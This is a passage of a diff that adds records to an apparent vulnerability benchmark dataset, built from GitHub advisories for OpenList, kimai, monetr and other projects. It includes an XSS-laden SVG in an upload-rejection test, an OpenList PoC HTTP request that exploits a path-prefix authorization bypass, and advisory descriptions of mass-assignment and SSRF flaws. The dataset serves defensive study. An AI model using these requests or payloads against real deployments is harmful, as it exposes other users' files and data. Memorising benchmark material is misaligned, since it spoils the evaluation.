+          "text": "it('display correct editor content value', function (): void {\n    Livewire\\Livewire::test(MarkdownEditor::class)\n        ->set('content', 'foo')\n        ->assertSet('content', 'foo');\n});\n\nit('rejects html file uploads', function (): void {\n    Storage::fake('local');\n\n    $htmlFile = UploadedFile::fake()->createWithContent(\n        'phishing.html',\n        '<html><body>phishing</body></html>',\n    );\n\n    Livewire\\Livewire::test(MarkdownEditor::class)\n        ->set('attachments', [$htmlFile])\n        ->assertHasErrors(['attachments.0']);\n\n    expect(Storage::disk('local')->allFiles())->toBeEmpty();\n});\n\nit('rejects svg file uploads by default', function (): void {\n    Storage::fake('local');\n\n    $svgFile = UploadedFile::fake()->createWithContent(\n        'payload.svg',\n        '<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>',\n    );\n\n    Livewire\\Livewire::test(MarkdownEditor::class)\n        ->set('attachments', [$svgFile])\n        ->assertHasErrors(['attachments.0']);\n\n    expect(Storage::disk('local')->allFiles())->toBeEmpty();\n});\n\nit('rejects files with disallowed extension even if renamed', function (): void {\n    Storage::fake('local');\n\n    $exeFile = UploadedFile::fake()->createWithContent(\n        'malware.exe',\n        'MZ binary content',\n    );\n\n    Livewire\\Livewire::test(MarkdownEditor::class)\n        ->set('attachments', [$exeFile])\n        ->assertHasErrors(['attachments.0']);\n\n    expect(Storage::disk('local')->allFiles())->toBeEmpty();\n});\n\nit('rejects files exceeding the configured max size', function (): void {\n    Storage::fake('local');\n    config()->set('livewire-markdown-editor.upload.max_size', 100);\n\n    $largeImage = UploadedFile::fake()->image('large.png')->size(200);\n\n    Livewire\\Livewire::test(MarkdownEditor::c",
+          "text_sha256": "6acc9ace489100883d05a0f7178e4286d7959498103bfe9c63174754bdfb0eb2"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "filename": "tests/Unit/MarkdownEditorTest.php",
+            "fix_sha": "1e60eaa5781e89704e112425f832774be85cd71f",
+            "line_start": 63
+          },
+          "origin": "exact_revision_upstream_test_control",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "upload"
+            ]
+          },
+          "source_state_role": "fixed_test_control_state",
+          "text": "});\n\nit('rejects files exceeding the configured max size', function (): void {\n    Storage::fake('local');\n    config()->set('livewire-markdown-editor.upload.max_size', 100);\n\n    $largeImage = UploadedFile::fake()->image('large.png')->size(200);\n\n    Livewire\\Livewire::test(MarkdownEditor::class)\n        ->set('attachments', [$largeImage])\n        ->assertHasErrors(['attachments.0']);\n\n    expect(Storage::disk('local')->allFiles())->toBeEmpty();\n});\n\nit('accepts valid image uploads and inserts sanitized markdown', function (): void {\n    Storage::fake('local');\n\n    $image = UploadedFile::fake()->image('photo.png');\n\n    Livewire\\Livewire::test(MarkdownEditor::class)\n        ->set('attachments', [$image])\n        ->assertHasNoErrors()\n        ->assertSet('attachments', []);\n\n    expect(Storage::disk('local')->allFiles())->toHaveCount(1);\n});",
+          "text_sha256": "d595c39afb92142f9e478e15af04b1512f98104d0ce5f12afc2d03572db7cf09"
+        }
+      ],
+      "scoring_executed": false,
+      "source_project": "mckenziearts/livewire-markdown-editor",
+      "source_replacement_used": false,
+      "source_root": "GHSA-gxxh-8vcj-w2mh",
+      "source_snapshot_sha256": "7b53afd000ba889d0954bd07dfa08190cc5538e16deedce9c0bf5a9364ef9445",
+      "standards_rubric": {
+        "counts_as_target_evidence": false,
+        "cwe_ids": [
+          "CWE-434"
+        ],
+        "owasp_ids": [
+          "A06:2025"
+        ],
+        "principle": "Upload capability alone is not a weakness; promotion requires observed unsafe acceptance, storage, serving, or processing of attacker-controlled files.",
+        "wstg_ids": [
+          "WSTG-BUSL-08",
+          "WSTG-BUSL-09"
+        ]
+      },
+      "target_contact_performed": false,
+      "third_party_code_executed": false,
+      "unclassified_record_count": 1,
+      "vulnerable_condition_record_count": 3,
+      "vulnerable_identity_or_surface_record_count": 4,
+      "vulnerable_state_record_count": 4,
+      "writeup_rubric_sha256": "7ac3bbc4a08360607ae7f9d353092b6e2a0f13e11b3afbca2a3dffdacbe927d0",
+      "writeups_count_as_target_evidence": false
+    },
+    {
+      "canonical_reference": "https://github.com/edgexfoundry/edgex-go/security/advisories/GHSA-g63h-q855-vp3q",
+      "capture_id": "v7-improper_inventory_management-positive",
+      "current_missing_requirements": [
+        "control_is_present_without_literal_override"
+      ],
+      "engine_output_used": false,
+      "exact_revision_pair_identity_match": true,
+      "exact_revision_pair_present_in_historical_pack": true,
+      "exact_revision_pair_skipped_due_identity_mismatch": false,
+      "exact_revision_pair_used": false,
+      "family": "improper_inventory_management",
+      "first_blind_consumed": false,
+      "fixed_state_record_count": 0,
+      "human_adjudication_performed": false,
+      "record_count": 0,
+      "records": [],
+      "scoring_executed": false,
+      "source_project": "edgexfoundry/edgex-go",
+      "source_replacement_used": false,
+      "source_root": "GHSA-g63h-q855-vp3q",
+      "source_snapshot_sha256": "037d97cf0c5fe23caf0f402620c3536e73be4488b63604b675823c490d04aee0",
+      "standards_rubric": {
+        "counts_as_target_evidence": false,
+        "cwe_ids": [
+          "CWE-200",
+          "CWE-862",
+          "CWE-1104"
+        ],
+        "owasp_ids": [
+          "API9:2023"
+        ],
+        "principle": "Version/non-production naming is only inventory surface. CWE mapping is intentionally contextual and is assigned only when the observed legacy/non-production condition exposes a concrete weakness.",
+        "wstg_ids": [
+          "WSTG-APIT-01",
+          "WSTG-CONF-04"
+        ]
+      },
+      "target_contact_performed": false,
+      "third_party_code_executed": false,
+      "unclassified_record_count": 0,
+      "vulnerable_condition_record_count": 0,
+      "vulnerable_identity_or_surface_record_count": 0,
+      "vulnerable_state_record_count": 0,
+      "writeup_rubric_sha256": "50c04e2e4c768003938dff8d6da0753b45511ad7adf567b85f544d990f3c45ea",
+      "writeups_count_as_target_evidence": false
+    },
+    {
+      "canonical_reference": "https://github.com/OpenListTeam/OpenList/security/advisories/GHSA-p6ph-3jx2-3337",
+      "capture_id": "v7-information_disclosure-positive",
+      "current_missing_requirements": [
+        "control_is_present_without_literal_override"
+      ],
+      "engine_output_used": false,
+      "exact_revision_pair_identity_match": false,
+      "exact_revision_pair_present_in_historical_pack": true,
+      "exact_revision_pair_skipped_due_identity_mismatch": true,
+      "exact_revision_pair_used": false,
+      "family": "information_disclosure",
+      "first_blind_consumed": false,
+      "fixed_state_record_count": 0,
+      "human_adjudication_performed": false,
+      "record_count": 3,
+      "records": [
+        {
+          "heading": "Details",
+          "metadata": {
+            "canonical_reference": "https://github.com/OpenListTeam/OpenList/security/advisories/GHSA-p6ph-3jx2-3337",
+            "snapshot_sha256": "14c80b0449720810fb259c302dafaf9df51bd34b2ca962969fa0a85d13036b41",
+            "source_root": "GHSA-p6ph-3jx2-3337"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 1,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [
+              "unauthorized_data_response"
+            ],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "internal"
+            ]
+          },
+          "source_state_role": "vulnerable_or_impact_state",
+          "text": "This vulnerability stems from two combined logic flaws when the `bleve` search engine is utilized:\n\n1. **Insecure Path Prefix Validation:** In the search handler (`server/handles/search.go`), the application attempts to restrict search results to the user's allowed namespace using a simple prefix check: `strings.HasPrefix(node.Parent, user.BasePath)`. Because this function is not path-separator aware, a user with a `BasePath` restricted to `/base` will successfully pass the authorization check for a completely separate directory named `/base2` (since \"/base2\" starts with \"/base\").\n\n2. **Unfiltered Total Count Leakage:** The `bleve` backend (`internal/search/bleve/search.go`) searches the index globally and ignores the `req.Parent` boundary. Even if the application later successfully filters out unauthorized items from the `Content` array (e.g., via `CanAccess` meta password checks), it still returns the raw `Total` count provided by the search backend. This allows an attacker to perform blind data-enumeration, confirming the existence of sensitive files outside their namespace by observing the `Total` count.",
+          "text_sha256": "61767246e126e8eca8e003954d4e3e0c98f27b971b3110b2afeebf42039bf581"
+        },
+        {
+          "heading": "PoC",
+          "metadata": {
+            "canonical_reference": "https://github.com/OpenListTeam/OpenList/security/advisories/GHSA-p6ph-3jx2-3337",
+            "snapshot_sha256": "14c80b0449720810fb259c302dafaf9df51bd34b2ca962969fa0a85d13036b41",
+            "source_root": "GHSA-p6ph-3jx2-3337"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 1,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 2
+          },
+          "signal_hits": {
+            "condition": [
+              "unauthorized_data_response"
+            ],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "secret",
+              "token"
+            ]
+          },
+          "source_state_role": "vulnerable_or_impact_state",
+          "text": "**Prerequisites:**\n1. Log in as an administrator and set the Search Index Mode to `bleve`. Build the index.\n2. Create two directories at the root level: `/base` and `/base2`.\n3. Upload a sensitive file into the unauthorized directory: `/base2/secret_financial_report.pdf`.\n4. Create a low-privileged test user and strictly set their `Base path` to `/base`.\n\n**Exploitation Steps:**\n1. Authenticate as the newly created low-privileged user.\n2. Send the following HTTP request to the search API:\n```http\nPOST /api/fs/search HTTP/1.1\nHost: <your-openlist-host>\nAuthorization: <test-user-token>\nContent-Type: application/json\n\n{\n  \"parent\": \"/\",\n  \"keywords\": \"secret\",\n  \"page\": 1,\n  \"per_page\": 20,\n  \"scope\": 0\n}\n```\n3. Observe the response: Due to the prefix bypass (`strings.HasPrefix(\"/base2\", \"/base\") == true`), the metadata for `secret_financial_report.pdf` will be leaked in the response Content.\n    - Alternatively, even if access is further blocked by folder-level passwords, the Total field will return > 0, allowing the attacker to blindly confirm the existence of the keyword \"secret\" in unauthorized global directories.\n \n<img width=\"2112\" height=\"1381\" alt=\"image\" src=\"https://github.com/user-attachments/assets/9f8c5e18-8744-4363-8d3f-5e6cf691f061\" />",
+          "text_sha256": "c586c1d0b8bad78a31ab4b9fbf1c5007925129afd856e41757c0f54a768c13fd"
+        },
+        {
+          "heading": "Impact",
+          "metadata": {
+            "canonical_reference": "https://github.com/OpenListTeam/OpenList/security/advisories/GHSA-p6ph-3jx2-3337",
+            "snapshot_sha256": "14c80b0449720810fb259c302dafaf9df51bd34b2ca962969fa0a85d13036b41",
+            "source_root": "GHSA-p6ph-3jx2-3337"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "internal"
+            ]
+          },
+          "source_state_role": "vulnerable_or_impact_state",
+          "text": "This is an Information Disclosure and Horizontal/Vertical Privilege Escalation vulnerability. Any authenticated user can enumerate hidden infrastructure, verify the existence of sensitive files (e.g., passwords, internal documents), and extract file metadata across the entire storage namespace, completely defeating the BasePath isolation mechanism.",
+          "text_sha256": "88af0975844f59af65d926e0d32d05b7772de5c074aed567057ca0954027cd1b"
+        }
+      ],
+      "scoring_executed": false,
+      "source_project": "OpenListTeam/OpenList",
+      "source_replacement_used": false,
+      "source_root": "GHSA-p6ph-3jx2-3337",
+      "source_snapshot_sha256": "14c80b0449720810fb259c302dafaf9df51bd34b2ca962969fa0a85d13036b41",
+      "standards_rubric": {
+        "counts_as_target_evidence": false,
+        "cwe_ids": [
+          "CWE-200"
+        ],
+        "owasp_ids": [
+          "A01:2025"
+        ],
+        "principle": "Sensitive-looking fields are only clues; promotion requires actual exposure to an unauthorized or unintended context.",
+        "wstg_ids": [
+          "WSTG-ERRH-01",
+          "WSTG-ERRH-02"
+        ]
+      },
+      "target_contact_performed": false,
+      "third_party_code_executed": false,
+      "unclassified_record_count": 0,
+      "vulnerable_condition_record_count": 2,
+      "vulnerable_identity_or_surface_record_count": 3,
+      "vulnerable_state_record_count": 3,
+      "writeup_rubric_sha256": "b5d28ad5cad57a1743605fffae22f1a649db87ea40aac16f00030b9de54e5df3",
+      "writeups_count_as_target_evidence": false
+    },
+    {
+      "canonical_reference": "https://github.com/kimai/kimai/security/advisories/GHSA-qh43-xrjm-4ggp",
+      "capture_id": "v7-mass_assignment-positive",
+      "current_missing_requirements": [
+        "control_is_present_without_literal_override"
+      ],
+      "engine_output_used": false,
+      "exact_revision_pair_identity_match": true,
+      "exact_revision_pair_present_in_historical_pack": true,
+      "exact_revision_pair_skipped_due_identity_mismatch": false,
+      "exact_revision_pair_used": false,
+      "family": "mass_assignment",
+      "first_blind_consumed": false,
+      "fixed_state_record_count": 0,
+      "human_adjudication_performed": false,
+      "record_count": 2,
+      "records": [
+        {
+          "heading": "Summary",
+          "metadata": {
+            "canonical_reference": "https://github.com/kimai/kimai/security/advisories/GHSA-qh43-xrjm-4ggp",
+            "snapshot_sha256": "3e2c4e607d24a2f89b02fa9af05ab0c143796fc4c8698ac622570de00703ce42",
+            "source_root": "GHSA-qh43-xrjm-4ggp"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 1,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 0
+          },
+          "signal_hits": {
+            "condition": [
+              "property_authorization_differential"
+            ],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": []
+          },
+          "source_state_role": "vulnerable_or_impact_state",
+          "text": "A Mass Assignment / Broken Object Property Level Authorization (BOPA) vulnerability in the User Preferences API allows any authenticated user (even those with the lowest privileges) to arbitrarily modify restricted financial attributes on their profile, specifically their `hourly_rate` and `internal_rate`.",
+          "text_sha256": "48b98c4909a804b0b9b42ff3eb907cfa7c4d81d8f3f9b10f622e693804c401ab"
+        },
+        {
+          "heading": "Details",
+          "metadata": {
+            "canonical_reference": "https://github.com/kimai/kimai/security/advisories/GHSA-qh43-xrjm-4ggp",
+            "snapshot_sha256": "3e2c4e607d24a2f89b02fa9af05ab0c143796fc4c8698ac622570de00703ce42",
+            "source_root": "GHSA-qh43-xrjm-4ggp"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 4
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "custom field",
+              "patch object",
+              "permissions",
+              "role"
+            ]
+          },
+          "source_state_role": "vulnerable_or_impact_state",
+          "text": "Kimai restrictively protects the `hourly_rate` and `internal_rate` parameters during standard GUI flow. Users lacking the `hourly-rate` role permissions cannot see or edit these fields via the standard Web Form (`UserApiEditForm` / `UserEditType`). \n\nThe vulnerability exists in the dedicated preferences API endpoint: `src/API/UserController.php::updateUserPreference`.\n\nWhen a `PATCH` request is sent to `/api/users/{id}/preferences`, the endpoint iterates through the submitted JSON array and blindly applies the new values:\n```php\nforeach ($request->request->all() as $preference) {\n    // ... validation omitted ...\n    if (null === ($meta = $profile->getPreference($name))) {\n        throw $this->createNotFoundException(\\sprintf('Unknown custom-field \"%s\" requested', $name));\n    }\n\n    $meta->setValue($value); // <-- VULNERABILITY\n}\n```\n\nThe underlying Role-Based Access Control logic (`UserPreferenceSubscriber::getDefaultPreferences`) accurately identifies that standard users lack the `hourly-rate` role, and flags the dynamically generated preference object as disabled (`$preference->setEnabled(false)`). \n\nHowever, the `updateUserPreference` API endpoint entirely ignores this `isEnabled()` flag and forcefully saves the mutated object to the database natively via Doctrine ORM. This allows unauthorized accounts to manipulate the business-logic variables calculating their own financial earnings.",
+          "text_sha256": "4d87e8d4a04d92c69e7b801d64a3fe33259e504c48dab32b71026bdbd59d2e2d"
+        }
+      ],
+      "scoring_executed": false,
+      "source_project": "kimai/kimai",
+      "source_replacement_used": false,
+      "source_root": "GHSA-qh43-xrjm-4ggp",
+      "source_snapshot_sha256": "3e2c4e607d24a2f89b02fa9af05ab0c143796fc4c8698ac622570de00703ce42",
+      "standards_rubric": {
+        "counts_as_target_evidence": false,
+        "cwe_ids": [
+          "CWE-915"
+        ],
+        "owasp_ids": [
+          "API3:2023",
+          "A01:2025"
+        ],
+        "principle": "Writable object properties are only a surface; promotion requires unauthorized modification of a property outside the caller's policy.",
+        "wstg_ids": [
+          "WSTG-INPV-20"
+        ]
+      },
+      "target_contact_performed": false,
+      "third_party_code_executed": false,
+      "unclassified_record_count": 0,
+      "vulnerable_condition_record_count": 1,
+      "vulnerable_identity_or_surface_record_count": 1,
+      "vulnerable_state_record_count": 2,
+      "writeup_rubric_sha256": "7a024f6d789b57f541a9a276208bd5b3efc2b801a0f69674c7f07cb956c7b3ac",
+      "writeups_count_as_target_evidence": false
+    },
+    {
+      "canonical_reference": "https://github.com/monetr/monetr/security/advisories/GHSA-29v9-frvh-c426",
+      "capture_id": "v7-security_misconfiguration-positive",
+      "current_missing_requirements": [
+        "literal_decisive_condition"
+      ],
+      "engine_output_used": false,
+      "exact_revision_pair_identity_match": true,
+      "exact_revision_pair_present_in_historical_pack": true,
+      "exact_revision_pair_skipped_due_identity_mismatch": false,
+      "exact_revision_pair_used": true,
+      "family": "security_misconfiguration",
+      "first_blind_consumed": false,
+      "fixed_state_record_count": 16,
+      "human_adjudication_performed": false,
+      "record_count": 25,
+      "records": [
+        {
+          "heading": "Impact",
+          "metadata": {
+            "canonical_reference": "https://github.com/monetr/monetr/security/advisories/GHSA-29v9-frvh-c426",
+            "snapshot_sha256": "769d8754182d71d1b199bed6d95c6b15049607e5dd57b47fc5d888ce755dacf2",
+            "source_root": "GHSA-29v9-frvh-c426"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 2,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [
+              "insecure_http_enabled",
+              "unsafe_default_configuration"
+            ],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "http://"
+            ]
+          },
+          "source_state_role": "vulnerable_or_impact_state",
+          "text": "A server-side request forgery (SSRF) vulnerability in monetr's Lunch Flow integration allowed any authenticated user on\na self-hosted instance to cause the monetr server to issue HTTP GET requests to arbitrary URLs supplied by the caller,\nwith the response body from non-200 upstream responses reflected back in the API error message.\n\nThe URL validator on `POST /api/lunch_flow/link` only checked the URL scheme and rejected query parameters; it did not\nfilter loopback, RFC1918, link-local, or cloud-provider metadata addresses. The outbound HTTP client read the response\nbody via an unbounded `io.ReadAll`, and the controller intentionally surfaced the resulting error (which contained the\nupstream body) as the JSON `error` field of the API response.\n\n**Who is affected:** self-hosted monetr deployments running the default configuration. Out of the box,\n`LunchFlow.Enabled=true`, `AllowSignUp=true`, and billing is not enforced, so any user who can register on the instance\ncan reach the vulnerable endpoint. Deployments running in a cloud environment where instance metadata is reachable from\nthe pod (e.g. AWS EC2 without IMDSv2 enforced) expand the impact to include potential exposure of instance metadata\nthrough the reflected error body.\n\n**Who is NOT affected:** the hosted `my.monetr.app` service, which runs with `LunchFlow.Enabled=false`. Self-hosted\noperators who had already disabled public sign-up (`MONETR_ALLOW_SIGN_UP=false`) substantially reduce their exposure\nsince only operator-trusted users can reach the endpoint.\n\nA secondary denial-of-service vector also existed: because the outbound response body was read with no size cap, an\nattacker-influenced upstream could return a multi-GB body that monetr would fully buffer into memory.",
+          "text_sha256": "ac215899496ba3c2716ac8decb192bd70161dab6b4b165419a72b95bad749a40"
+        },
+        {
+          "heading": "Workarounds",
+          "metadata": {
+            "canonical_reference": "https://github.com/monetr/monetr/security/advisories/GHSA-29v9-frvh-c426",
+            "snapshot_sha256": "769d8754182d71d1b199bed6d95c6b15049607e5dd57b47fc5d888ce755dacf2",
+            "source_root": "GHSA-29v9-frvh-c426"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 1,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [
+              "insecure_http_enabled"
+            ],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "http://"
+            ]
+          },
+          "source_state_role": "fixed_or_remediation_state",
+          "text": "For operators who cannot upgrade immediately, any of the following materially reduces or eliminates exposure:\n\n- **Disable public sign-up:** set `MONETR_ALLOW_SIGN_UP=false` so only operator-trusted users can reach the vulnerable\nendpoint. Recommended in general for internet-exposed self-hosted deployments.\n- **Disable Lunch Flow entirely:** set `lunchFlow.enabled: false` in your config file. The endpoints will return 404 for\nall callers.\n- **Network-level egress restriction:** restrict outbound HTTP egress from the monetr pod/container to only\n`lunchflow.app` (or whichever legitimate Lunch Flow hosts you use). Blocks the SSRF primitive regardless of\napplication-layer validation.\n- **On AWS EC2 specifically:** enforce IMDSv2 on the instance. This eliminates the cloud-metadata exfil path even if the\nSSRF primitive remains reachable.",
+          "text_sha256": "5ba5f91ce3204bedf0f79c21bc63871c5e3c53c5f1fa915abab693d4d1d887b2"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "791d322ed53c7f6c66da5dcb66553d61d2facc8f82583ccee6f66d4650319c4d",
+            "filename": "interface/src/components/setup/lunchflow/LunchFlowSetupIntro.tsx",
+            "fix_sha": "c260caa3c573a4a396ec2d264c7641a5d958385b",
+            "line_end": 165,
+            "line_start": 114
+          },
+          "origin": "exact_revision_fix",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "options"
+            ]
+          },
+          "source_state_role": "fixed_or_remediation_state",
+          "text": "label='API Key'\n          name='apiKey'\n          placeholder='\u25cf\u25cf\u25cf\u25cf\u25cf\u25cf\u25cf\u25cf\u25cf\u25cf\u25cf\u25cf\u25cf\u25cf\u25cf\u25cf\u25cf\u25cf\u25cf\u25cf\u25cf\u25cf\u25cf\u25cf\u25cf\u25cf\u25cf\u25cf\u25cf\u25cf\u25cf\u25cf'\n          required\n          type='password'\n        />\n        <LunchFlowURLField allowedAPIURLs={allowedAPIURLs} />\n        <FormButton type='submit' variant='primary'>\n          Next\n        </FormButton>\n      </MForm>\n    </LunchFlowSetupLayout>\n  );\n}\n\ninterface LunchFlowURLFieldProps {\n  allowedAPIURLs: string[];\n}\n\nfunction LunchFlowURLField({ allowedAPIURLs }: LunchFlowURLFieldProps): React.JSX.Element {\n  const formikContext = useFormikContext<LunchFlowSetupIntroValues>();\n\n  if (allowedAPIURLs.length > 1) {\n    const options: SelectOption<string>[] = allowedAPIURLs.map(url => ({ label: url, value: url }));\n    const value = options.find(option => option.value === formikContext.values.apiURL);\n    return (\n      <Select\n        className={layoutVariants({ width: 'full' })}\n        label='API URL'\n        name='apiURL'\n        onChange={(newValue: SelectOption<string>) => formikContext.setFieldValue('apiURL', newValue.value)}\n        options={options}\n        required\n        value={value}\n      />\n    );\n  }\n\n  return (\n    <FormTextField\n      className={layoutVariants({ width: 'full' })}\n      data-1p-ignore\n      disabled\n      label='API URL'\n      name='apiURL'\n      placeholder='No API URLs configured!'\n      required\n      spellCheck='false'\n      type='url'\n    />\n  );\n}",
+          "text_sha256": "0115e6af23d1a59f937587a58eadd490745c325546d21860352cf323c4ab4b84"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "dcf09203bbf3613130cfb53b345aa629161aa3db2d2611279d120c46bca8e6f6",
+            "filename": "server/config/lunch_flow.go",
+            "fix_sha": "c260caa3c573a4a396ec2d264c7641a5d958385b",
+            "line_end": 87,
+            "line_start": 1
+          },
+          "origin": "exact_revision_fix",
+          "signal_hit_counts": {
+            "condition": 2,
+            "control": 0,
+            "identity": 1,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [
+              "insecure_http_enabled",
+              "unsafe_default_configuration"
+            ],
+            "control": [],
+            "identity": [
+              "deployment_configuration_surface"
+            ],
+            "override": [],
+            "surface": [
+              "http://"
+            ]
+          },
+          "source_state_role": "fixed_or_remediation_state",
+          "text": "package config\n\nimport (\n\t\"net/url\"\n\t\"strings\"\n\n\t\"github.com/pkg/errors\"\n)\n\nconst DefaultLunchFlowAPIURL = \"https://lunchflow.app/api/v1\"\n\ntype LunchFlow struct {\n\t// Enabled just determines whether or not Lunch Flow will be an option to\n\t// configure in the UI. This defaults to true as it requires no additional\n\t// configuration here for self-hosted users.\n\tEnabled bool `yaml:\"enabled\"`\n\t// AllowedApiUrls is the set of Lunch Flow API URLs this deployment is\n\t// permitted to contact. Comparison is exact-string.\n\tAllowedApiUrls []string `yaml:\"allowedApiUrls\"`\n}\n\n// ValidateConfig can be called at startup in order to catch problems with the\n// configuration early on. If lunch flow is not enabled then this is a no-op, if\n// lunch flow is enabled and there are allowed URLs specified; then this will\n// validate that those URLs specified are all valid.\nfunc (l LunchFlow) ValidateConfig() error {\n\tif !l.IsEnabled() {\n\t\treturn nil\n\t}\n\tfor _, allowed := range l.AllowedApiUrls {\n\t\tparsed, err := url.Parse(allowed)\n\t\tif err != nil {\n\t\t\treturn errors.Wrapf(err, \"configured Lunch Flow url (%s) is not valid\", allowed)\n\t\t}\n\n\t\t// Do not allow query parameters in the URL as these will be removed when\n\t\t// requests are made!\n\t\tif len(parsed.Query()) > 0 {\n\t\t\treturn errors.Errorf(\"Lunch Flow url (%s) cannot contain query parameters\", allowed)\n\t\t}\n\n\t\t// Require a scheme to be specified\n\t\tswitch strings.ToLower(parsed.Scheme) {\n\t\tcase \"http\", \"https\":\n\t\t\t// These are considered valid!\n\t\tdefault:\n\t\t\t// Any other scheme is not considered valid here!\n\t\t\treturn errors.Errorf(\"Lunch Flow url (%s) must use an http or https scheme\", allowed)\n\t\t}\n\t}\n\n\treturn nil\n}\n\n// IsEnabled only returns true if the lunch flow integration is enabled AND when\n// there is at least one allowed API URLs configured.",
+          "text_sha256": "f6d70078d67c23e0357980d598f2ad9de4487c6c3755f4bac8a2c457a662bcec"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "78fa6e2fa74a9109a556d70b6d7050299455e1b7139b9fc57dcf9ca099863aec",
+            "filename": "server/config/lunch_flow_test.go",
+            "fix_sha": "c260caa3c573a4a396ec2d264c7641a5d958385b",
+            "line_end": 96,
+            "line_start": 1
+          },
+          "origin": "exact_revision_fix",
+          "signal_hit_counts": {
+            "condition": 1,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [
+              "insecure_http_enabled"
+            ],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "http://"
+            ]
+          },
+          "source_state_role": "fixed_or_remediation_state",
+          "text": "package config_test\n\nimport (\n\t\"testing\"\n\n\t\"github.com/monetr/monetr/server/config\"\n\t\"github.com/stretchr/testify/assert\"\n)\n\nfunc TestLunchFlow_ValidateConfig(t *testing.T) {\n\tt.Run(\"disabled is a no-op\", func(t *testing.T) {\n\t\tconfiguration := config.LunchFlow{\n\t\t\tEnabled:        false,\n\t\t\tAllowedApiUrls: []string{\"not a valid url\"},\n\t\t}\n\t\tassert.NoError(t, configuration.ValidateConfig())\n\t})\n\n\tt.Run(\"no allowed urls is a no-op\", func(t *testing.T) {\n\t\tconfiguration := config.LunchFlow{\n\t\t\tEnabled: true,\n\t\t}\n\t\tassert.NoError(t, configuration.ValidateConfig())\n\t})\n\n\tt.Run(\"valid urls are accepted\", func(t *testing.T) {\n\t\tconfiguration := config.LunchFlow{\n\t\t\tEnabled: true,\n\t\t\tAllowedApiUrls: []string{\n\t\t\t\t\"https://lunchflow.app/api/v1\",\n\t\t\t\t\"http://lunchflow.app/api/v1\",\n\t\t\t},\n\t\t}\n\t\tassert.NoError(t, configuration.ValidateConfig())\n\t})\n\n\tt.Run(\"unparseable url is rejected\", func(t *testing.T) {\n\t\tconfiguration := config.LunchFlow{\n\t\t\tEnabled:        true,\n\t\t\tAllowedApiUrls: []string{\"https://lunchflow.app/%zz\"},\n\t\t}\n\t\tassert.EqualError(t, configuration.ValidateConfig(), `configured Lunch Flow url (https://lunchflow.app/%zz) is not valid: parse \"https://lunchflow.app/%zz\": invalid URL escape \"%zz\"`)\n\t})\n\n\tt.Run(\"url with query parameters is rejected\", func(t *testing.T) {\n\t\tconfiguration := config.LunchFlow{\n\t\t\tEnabled:        true,\n\t\t\tAllowedApiUrls: []string{\"https://lunchflow.app/api/v1?token=secret\"},\n\t\t}\n\t\tassert.EqualError(t, configuration.ValidateConfig(), \"Lunch Flow url (https://lunchflow.app/api/v1?token=secret) cannot contain query parameters\")\n\t})\n\n\tt.Run(\"invalid url in config\", func(t *testing.T) {\n\t\tconfiguration := config.LunchFlow{\n\t\t\tEnabled:        true,\n\t\t\tAllowedApiUrls: []string{\"example.com\"},\n\t\t}\n\t\tassert.EqualError(t, configuration.ValidateConfig",
+          "text_sha256": "1eb5ba9fca34564dad3d28963c9ead2d434a5ba01cff88acbe9fd4b0d5368949"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "filename": "server/config/lunch_flow_test.go",
+            "fix_sha": "c260caa3c573a4a396ec2d264c7641a5d958385b",
+            "line_start": 8
+          },
+          "origin": "exact_revision_upstream_test_control",
+          "signal_hit_counts": {
+            "condition": 1,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [
+              "insecure_http_enabled"
+            ],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "http://"
+            ]
+          },
+          "source_state_role": "fixed_test_control_state",
